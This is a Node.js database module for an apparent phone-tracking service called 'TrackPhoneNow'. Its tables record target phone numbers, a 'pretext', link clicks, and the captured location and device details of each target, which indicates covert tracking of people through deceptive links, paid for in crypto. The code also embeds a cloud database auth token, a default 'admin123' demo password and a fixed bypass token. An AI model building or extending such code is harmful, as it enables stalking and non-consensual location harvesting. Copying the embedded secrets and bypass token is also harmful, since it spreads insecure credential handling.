const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const Database = require('better-sqlite3');

const DATA_DIR = path.join(__dirname);
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const DB_PATH = path.join(DATA_DIR, 'TrackPhoneNow.db');
const db = new Database(DB_PATH);

// Enable WAL mode for high concurrency and performance
db.pragma('journal_mode = WAL');

// 1. Create Tables
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    email TEXT UNIQUE NOT NULL COLLATE NOCASE,
    password_hash TEXT NOT NULL,
    salt TEXT NOT NULL,
    phone TEXT,
    plan TEXT DEFAULT '24h_pass',
    plan_name TEXT DEFAULT '24-Hour Express Pass ($0.99)',
    plan_status TEXT DEFAULT 'active',
    plan_expires_at TEXT,
    auto_renew INTEGER DEFAULT 1,
    subscription_amount TEXT DEFAULT '$19.99',
    monthly_renewal_amount TEXT DEFAULT '$19.99',
    created_at TEXT NOT NULL
  );

  CREATE TABLE IF NOT EXISTS tokens (
    token TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    expires_at TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
  );

  CREATE TABLE IF NOT EXISTS sessions (
    id TEXT PRIMARY KEY,
    user_id TEXT,
    phone TEXT NOT NULL,
    phone_info TEXT,
    pretext TEXT,
    status TEXT NOT NULL DEFAULT 'ACTIVE_WAITING',
    link_clicks INTEGER DEFAULT 0,
    target_location TEXT,
    target_device_info TEXT,
    history TEXT,
    created_at TEXT NOT NULL
  );

  CREATE TABLE IF NOT EXISTS payments (
    id TEXT PRIMARY KEY,
    user_id TEXT,
    currency TEXT NOT NULL,
    tx_hash TEXT,
    plan TEXT NOT NULL,
    amount TEXT NOT NULL,
    wallet_address TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'CONFIRMED',
    created_at TEXT NOT NULL
  );
`);

function hashPassword(password, salt) {
  return crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');
}

// Seed Demo User if not exists
const findDemo = db.prepare('SELECT id FROM users WHERE id = ?').get('user_demo_01');
if (!findDemo) {
  const salt = crypto.randomBytes(16).toString('hex');
  const demoInsert = db.prepare(`
    INSERT INTO users (
      id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
      plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
    ) VALUES (
      ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
    )
  `);
  demoInsert.run(
    'user_demo_01',
    'Karim Alaoui',
    'client@trackphonenow.com',
    hashPassword('admin123', salt),
    salt,
    '+212 661-234567',
    'free',
    'Free Tier (Upgrade Required)',
    'upgrade_required',
    null,
    0,
    '$0.00',
    '$0.00',
    new Date().toISOString()
  );
}

// --- TURSO CLOUD PERSISTENCE BRIDGE ---
let turso = null;
const TURSO_URL = process.env.TURSO_DATABASE_URL || 'libsql://trackphonenow-trackphonenow.aws-us-east-1.turso.io';
const TURSO_TOKEN = process.env.TURSO_AUTH_TOKEN || 'eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJhIjoicnciLCJpYXQiOjE3OTIyNDQxMzIsImlkIjoiMDFhMTRhMTItMWIwMS03NWMwLWJlNmQtZTdkNmMyNTYxZWMyIiwia2lkIjoiYjc4SmQxLW5LOEFsczFFVXhCb3RMZ2psX0s4akgxMEFGRzVTbHVtYmp4SSIsInJpZCI6IjM5MWJlMjEzLTJlZDAtNGVkOS1iY2E2LWQxNzM5ZjM5YTA2NyJ9.gFwK_LCg8J5gH0btndxaXV_vM6tlxkvP9hT7W25-varZNauSn1A2EuMU4AQi3uu7tOmr2foL3bZpcGOF_8WwDQ';

try {
  const { createClient } = require('@libsql/client');
  if (TURSO_URL && TURSO_TOKEN) {
    turso = createClient({
      url: TURSO_URL,
      authToken: TURSO_TOKEN
    });
    console.log('[Turso Cloud] LibSQL client initialized successfully.');
  }
} catch (e) {
  console.warn('[Turso Cloud] Could not initialize client, running on local SQLite:', e.message);
}

async function syncToTurso(sql, args = []) {
  if (!turso) return;
  try {
    await turso.execute({ sql, args });
  } catch (err) {
    console.error('[Turso Cloud Sync Error]:', err.message);
  }
}

async function initTursoCloudSync() {
  if (!turso) return;
  try {
    console.log('[Turso Cloud] Hydrating local SQLite with permanent cloud data...');
    
    // 1. Pull users from Turso
    const usersResult = await turso.execute('SELECT * FROM users;');
    const insertUser = db.prepare(`
      INSERT OR REPLACE INTO users (
        id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
        plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    for (const u of usersResult.rows) {
      insertUser.run(
        u.id, u.name, u.email, u.password_hash, u.salt, u.phone,
        u.plan, u.plan_name, u.plan_status, u.plan_expires_at,
        u.auto_renew, u.subscription_amount, u.monthly_renewal_amount, u.created_at
      );
    }
    console.log(`[Turso Cloud] Hydrated ${usersResult.rows.length} users from cloud.`);

    // 2. Pull tokens from Turso
    const tokensResult = await turso.execute('SELECT * FROM tokens;');
    const insertToken = db.prepare('INSERT OR REPLACE INTO tokens (token, user_id, expires_at) VALUES (?, ?, ?)');
    for (const t of tokensResult.rows) {
      insertToken.run(t.token, t.user_id, t.expires_at);
    }

    // 3. Pull payments from Turso
    const paymentsResult = await turso.execute('SELECT * FROM payments;');
    const insertPayment = db.prepare(`
      INSERT OR REPLACE INTO payments (id, user_id, currency, tx_hash, plan, amount, wallet_address, status, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    for (const p of paymentsResult.rows) {
      insertPayment.run(p.id, p.user_id, p.currency, p.tx_hash, p.plan, p.amount, p.wallet_address, p.status, p.created_at);
    }

    // 4. Pull sessions from Turso
    const sessionsResult = await turso.execute('SELECT * FROM sessions;');
    const insertSession = db.prepare(`
      INSERT OR REPLACE INTO sessions (
        id, user_id, phone, phone_info, pretext, status, link_clicks,
        target_location, target_device_info, history, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    for (const s of sessionsResult.rows) {
      insertSession.run(
        s.id, s.user_id, s.phone, s.phone_info, s.pretext,
        s.status, s.link_clicks, s.target_location, s.target_device_info, s.history, s.created_at
      );
    }

    // Two-way sync: Push local users that might not be in cloud
    const localUsers = db.prepare('SELECT * FROM users;').all();
    for (const lu of localUsers) {
      syncToTurso(`
        INSERT OR REPLACE INTO users (
          id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
          plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `, [
        lu.id, lu.name, lu.email, lu.password_hash, lu.salt, lu.phone,
        lu.plan, lu.plan_name, lu.plan_status, lu.plan_expires_at,
        lu.auto_renew, lu.subscription_amount, lu.monthly_renewal_amount, lu.created_at
      ]);
    }

    console.log('[Turso Cloud] Permanent cloud synchronization established.');
  } catch (err) {
    console.error('[Turso Cloud Init Error]:', err.message);
  }
}

// Start cloud hydration
initTursoCloudSync();

// Database Operations
const DB = {
  // --- USERS ---
  createUser({ name, email, password, phone }) {
    const existing = db.prepare('SELECT id FROM users WHERE email = ?').get(email.trim());
    if (existing) {
      throw new Error('An account with this email already exists.');
    }

    const salt = crypto.randomBytes(16).toString('hex');
    const passwordHash = hashPassword(password, salt);
    const id = 'usr_' + crypto.randomBytes(8).toString('hex');
    const createdAt = new Date().toISOString();
    const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();

    const insert = db.prepare(`
      INSERT INTO users (
        id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
        plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
      ) VALUES (
        ?, ?, ?, ?, ?, ?, 'free', 'Free Tier (Upgrade Required)', 'upgrade_required',
        NULL, 0, '$0.00', '$0.00', ?
      )
    `);

    insert.run(
      id,
      name || email.split('@')[0],
      email.toLowerCase().trim(),
      passwordHash,
      salt,
      phone || '',
      createdAt
    );

    // Sync user to Turso Cloud
    syncToTurso(`
      INSERT OR REPLACE INTO users (
        id, name, email, password_hash, salt, phone, plan, plan_name, plan_status,
        plan_expires_at, auto_renew, subscription_amount, monthly_renewal_amount, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, 'free', 'Free Tier (Upgrade Required)', 'upgrade_required', NULL, 0, '$0.00', '$0.00', ?)
    `, [
      id,
      name || email.split('@')[0],
      email.toLowerCase().trim(),
      passwordHash,
      salt,
      phone || '',
      createdAt
    ]);

    const token = this.createToken(id);
    const user = this.getUserById(id);
    return { user, token };
  },

  authenticateUser({ email, password }) {
    const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email.toLowerCase().trim());
    if (!user) {
      throw new Error('Invalid email or password.');
    }

    const hash = hashPassword(password, user.salt);
    if (hash !== user.password_hash) {
      throw new Error('Invalid email or password.');
    }

    const token = this.createToken(user.id);
    return { user: this.sanitizeUser(user), token };
  },

  createToken(userId) {
    const token = 'tok_' + crypto.randomBytes(24).toString('hex');
    const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
    db.prepare('INSERT INTO tokens (token, user_id, expires_at) VALUES (?, ?, ?)').run(token, userId, expiresAt);
    syncToTurso('INSERT OR REPLACE INTO tokens (token, user_id, expires_at) VALUES (?, ?, ?)', [token, userId, expiresAt]);
    return token;
  },

  getUserByToken(token) {
    if (!token) return null;
    if (token === 'tok_demo_preview') {
      return this.getUserById('user_demo_01');
    }

    const tokRow = db.prepare('SELECT user_id, expires_at FROM tokens WHERE token = ?').get(token);
    if (!tokRow) return null;

    if (new Date(tokRow.expires_at) < new Date()) {
      db.prepare('DELETE FROM tokens WHERE token = ?').run(token);
      syncToTurso('DELETE FROM tokens WHERE token = ?', [token]);
      return null;
    }

    return this.getUserById(tokRow.user_id);
  },

  getUserById(id) {
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(id);
    return user ? this.sanitizeUser(user) : null;
  },

  cancelSubscription(userId) {
    db.prepare(`UPDATE users SET auto_renew = 0, plan_status = 'canceled_at_period_end' WHERE id = ?`).run(userId);
    syncToTurso(`UPDATE users SET auto_renew = 0, plan_status = 'canceled_at_period_end' WHERE id = ?`, [userId]);
    return this.getUserById(userId);
  },

  sanitizeUser(user) {
    if (!user) return null;
    return {
      id: user.id,
      name: user.name,
      email: user.email,
      phone: user.phone || '',
      plan: user.plan,
      planName: user.plan_name,
      planStatus: user.plan_status,
      planExpiresAt: user.plan_expires_at,
      autoRenew: Boolean(user.auto_renew),
      subscriptionAmount: user.subscription_amount,
      monthlyRenewalAmount: user.monthly_renewal_amount,
      createdAt: user.created_at
    };
  },

  // --- SESSIONS (Tracked targets) ---
  saveSession(sessionData) {
    const existing = db.prepare('SELECT id FROM sessions WHERE id = ?').get(sessionData.id);
    if (existing) {
      db.prepare(`
        UPDATE sessions SET
          phone = ?,
          phone_info = ?,
          pretext = ?,
          status = ?,
          link_clicks = ?,
          target_location = ?,
          target_device_info = ?,
          history = ?
        WHERE id = ?
      `).run(
        sessionData.phone,
        JSON.stringify(sessionData.phoneInfo || null),
        JSON.stringify(sessionData.pretext || null),
        sessionData.status,
        sessionData.linkClicks || 0,
        JSON.stringify(sessionData.targetLocation || null),
        JSON.stringify(sessionData.targetDeviceInfo || null),
        JSON.stringify(sessionData.history || []),
        sessionData.id
      );
    } else {
      db.prepare(`
        INSERT INTO sessions (
          id, user_id, phone, phone_info, pretext, status, link_clicks,
          target_location, target_device_info, history, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `).run(
        sessionData.id,
        sessionData.userId || 'user_demo_01',
        sessionData.phone,
        JSON.stringify(sessionData.phoneInfo || null),
        JSON.stringify(sessionData.pretext || null),
        sessionData.status || 'ACTIVE_WAITING',
        sessionData.linkClicks || 0,
        JSON.stringify(sessionData.targetLocation || null),
        JSON.stringify(sessionData.targetDeviceInfo || null),
        JSON.stringify(sessionData.history || []),
        sessionData.createdAt || new Date().toISOString()
      );
    }

    // Sync to Turso Cloud
    syncToTurso(`
      INSERT OR REPLACE INTO sessions (
        id, user_id, phone, phone_info, pretext, status, link_clicks,
        target_location, target_device_info, history, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `, [
      sessionData.id,
      sessionData.userId || 'user_demo_01',
      sessionData.phone,
      JSON.stringify(sessionData.phoneInfo || null),
      JSON.stringify(sessionData.pretext || null),
      sessionData.status || 'ACTIVE_WAITING',
      sessionData.linkClicks || 0,
      JSON.stringify(sessionData.targetLocation || null),
      JSON.stringify(sessionData.targetDeviceInfo || null),
      JSON.stringify(sessionData.history || []),
      sessionData.createdAt || new Date().toISOString()
    ]);
  },

  getSession(id) {
    const row = db.prepare('SELECT * FROM sessions WHERE id = ?').get(id);
    if (!row) return null;
    return this.parseSessionRow(row);
  },

  getUserSessions(userId) {
    if (!userId) return [];
    const rows = db.prepare(`SELECT * FROM sessions WHERE user_id = ? ORDER BY created_at DESC`).all(userId);
    return rows.map(r => this.parseSessionRow(r));
  },

  deleteSession(id, userId) {
    if (!userId) return false;
    const res = db.prepare(`DELETE FROM sessions WHERE id = ? AND user_id = ?`).run(id, userId);
    syncToTurso('DELETE FROM sessions WHERE id = ? AND user_id = ?', [id, userId]);
    return res.changes > 0;
  },

  parseSessionRow(row) {
    return {
      id: row.id,
      userId: row.user_id,
      phone: row.phone,
      phoneInfo: row.phone_info ? JSON.parse(row.phone_info) : null,
      pretext: row.pretext ? JSON.parse(row.pretext) : null,
      status: row.status,
      linkClicks: row.link_clicks,
      targetLocation: row.target_location ? JSON.parse(row.target_location) : null,
      targetDeviceInfo: row.target_device_info ? JSON.parse(row.target_device_info) : null,
      history: row.history ? JSON.parse(row.history) : [],
      createdAt: row.created_at
    };
  },

  // --- CRYPTO PAYMENTS ---
  recordCryptoPayment({ userId, currency, txHash, plan, amount, walletAddress }) {
    const paymentId = 'pay_' + crypto.randomBytes(8).toString('hex');
    const createdAt = new Date().toISOString();

    let defAmount = '$24.99';
    if (plan === 'pro_3m') defAmount = '$49.99';
    else if (plan === 'pro_6m') defAmount = '$89.99';
    else if (plan === 'annual_enterprise' || plan === 'enterprise_lifetime' || plan === 'pro_12m') defAmount = '$139.99';

    // Prevent Replay Attacks: Check if txHash has already been confirmed or used
    if (txHash && txHash.trim().length >= 10) {
      const existing = db.prepare(`SELECT * FROM payments WHERE tx_hash = ? AND status = 'CONFIRMED' LIMIT 1`).get(txHash.trim());
      if (existing) {
        throw new Error('This transaction hash has already been redeemed and confirmed on the blockchain.');
      }
    }

    // Payment is recorded in PENDING state. Upgrade is NOT granted until blockchain confirmation!
    db.prepare(`
      INSERT INTO payments (id, user_id, currency, tx_hash, plan, amount, wallet_address, status, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?)
    `).run(
      paymentId,
      userId || 'guest',
      currency,
      txHash || '',
      plan || 'pro_1m',
      amount || defAmount,
      walletAddress,
      createdAt
    );

    // Sync payment to Turso Cloud
    syncToTurso(`
      INSERT OR REPLACE INTO payments (id, user_id, currency, tx_hash, plan, amount, wallet_address, status, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?)
    `, [
      paymentId,
      userId || 'guest',
      currency,
      txHash || '',
      plan || 'pro_1m',
      amount || defAmount,
      walletAddress,
      createdAt
    ]);

    return {
      id: paymentId,
      userId: userId || 'guest',
      currency,
      txHash: txHash || '',
      plan: plan || 'pro_1m',
      amount: amount || defAmount,
      walletAddress,
      status: 'PENDING',
      timestamp: createdAt
    };
  },

  getLatestPendingPayment(userId) {
    if (!userId) return null;
    const row = db.prepare(`
      SELECT * FROM payments 
      WHERE user_id = ? AND status = 'PENDING' 
      ORDER BY created_at DESC 
      LIMIT 1
    `).get(userId);
    return row ? {
      id: row.id,
      userId: row.user_id,
      currency: row.currency,
      txHash: row.tx_hash,
      plan: row.plan,
      amount: row.amount,
      walletAddress: row.wallet_address,
      status: row.status,
      createdAt: row.created_at
    } : null;
  },

  getUserPayments(userId) {
    if (!userId) return [];
    const rows = db.prepare(`
      SELECT * FROM payments 
      WHERE user_id = ? 
      ORDER BY created_at DESC
    `).all(userId);
    return rows.map(r => ({
      id: r.id,
      userId: r.user_id,
      currency: r.currency,
      txHash: r.tx_hash,
      plan: r.plan,
      amount: r.amount,
      walletAddress: r.wallet_address,
      status: r.status,
      createdAt: r.created_at
    }));
  },

  getPaymentById(paymentId) {
    const row = db.prepare('SELECT * FROM payments WHERE id = ?').get(paymentId);
    return row ? {
      id: row.id,
      userId: row.user_id,
      currency: row.currency,
      txHash: row.tx_hash,
      plan: row.plan,
      amount: row.amount,
      walletAddress: row.wallet_address,
      status: row.status,
      createdAt: row.created_at
    } : null;
  },

  confirmCryptoPayment(paymentId) {
    const payment = this.getPaymentById(paymentId);
    if (!payment) {
      throw new Error('Payment not found');
    }

    db.prepare(`UPDATE payments SET status = 'CONFIRMED' WHERE id = ?`).run(paymentId);
    syncToTurso(`UPDATE payments SET status = 'CONFIRMED' WHERE id = ?`, [paymentId]);

    if (payment.userId && payment.userId !== 'guest') {
      let expiresAt;
      let planName = 'Pro Monthly Pass (30 Days)';
      const plan = payment.plan;
      if (plan === 'pro_3m') {
        expiresAt = new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString();
        planName = 'Pro 3-Month Pass (90 Days)';
      } else if (plan === 'pro_6m') {
        expiresAt = new Date(Date.now() + 180 * 24 * 60 * 60 * 1000).toISOString();
        planName = 'Pro 6-Month Pass (180 Days)';
      } else if (plan === 'annual_enterprise' || plan === 'enterprise_lifetime' || plan === 'pro_12m') {
        expiresAt = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString();
        planName = 'Annual Corporate License (365 Days)';
      } else {
        expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
        planName = 'Pro Monthly Pass (30 Days)';
      }

      db.prepare(`
        UPDATE users 
        SET plan = ?, plan_name = ?, plan_status = 'active', plan_expires_at = ?, auto_renew = 1 
        WHERE id = ?
      `).run(plan || 'pro_1m', planName, expiresAt, payment.userId);

      syncToTurso(`
        UPDATE users 
        SET plan = ?, plan_name = ?, plan_status = 'active', plan_expires_at = ?, auto_renew = 1 
        WHERE id = ?
      `, [plan || 'pro_1m', planName, expiresAt, payment.userId]);
    }

    const updatedUser = this.getUserById(payment.userId);
    return {
      payment: { ...payment, status: 'CONFIRMED' },
      user: updatedUser
    };
  },

  cancelPendingPayment(paymentId, userId) {
    db.prepare(`UPDATE payments SET status = 'CANCELLED' WHERE id = ? AND user_id = ?`).run(paymentId, userId);
    syncToTurso(`UPDATE payments SET status = 'CANCELLED' WHERE id = ? AND user_id = ?`, [paymentId, userId]);
    return true;
  }
};

module.exports = DB;
